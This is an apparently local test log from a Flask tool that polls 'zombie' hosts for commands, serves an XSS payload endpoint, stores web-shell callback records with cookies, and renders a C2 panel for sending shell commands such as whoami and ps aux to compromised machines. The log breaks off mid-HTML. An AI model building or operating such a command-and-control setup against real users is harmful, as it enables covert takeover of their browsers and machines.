2025-06-25 11:26:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:49 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:26:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:26:59 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:26:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:26:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:26:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:12 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:14 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:16 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:19 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 11:27:21 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 11:27:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0003s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 11:27:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:21] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 11:27:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 11:27:21 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 11:27:21 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-25T03:27:21.711Z"}', None, '2025-06-25 11:27:21.715292', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 11:27:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0021s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 11:27:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:21] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 11:27:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 11:27:21 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-25 11:27:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0011s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            